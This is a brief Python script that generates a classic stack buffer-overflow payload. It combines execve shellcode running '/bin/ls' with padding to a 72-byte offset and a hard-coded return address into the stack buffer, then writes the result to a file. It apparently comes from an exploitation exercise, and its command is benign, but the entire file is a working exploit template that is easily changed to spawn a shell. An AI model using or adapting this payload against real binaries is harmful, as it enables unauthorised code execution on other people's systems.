import struct

buffer_address = 0x7fffffffed20

# /bin/ls
shellcode = (
    b"\x48\x31\xd2"
    b"\x48\xbb\x2f\x62\x69\x6e\x2f\x6c\x73\x00"
    b"\x53"
    b"\x48\x89\xe7"
    b"\x52"
    b"\x57"
    b"\x48\x89\xe6"
    b"\x48\xc7\xc0\x3b\x00\x00\x00"
    b"\x0f\x05"
)

offset = 72

# payload = b"\x90" * 8 NOP
payload = shellcode
payload += b"A" * (offset - len(payload))
payload += struct.pack("<Q", buffer_address)

with open("payload", "wb") as f:
    f.write(payload)

print(f"Surgical payload for '/bin/ls' created.")